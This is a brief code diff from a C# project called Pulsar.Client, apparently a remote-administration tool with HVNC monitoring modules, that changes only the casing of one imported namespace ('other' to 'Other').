@@ -11,7 +11,7 @@ using Pulsar.Client.Helper.HVNC;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Monitoring.HVNC;
-using Pulsar.Common.Messages.other;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video;
 using Pulsar.Common.Video.Codecs;
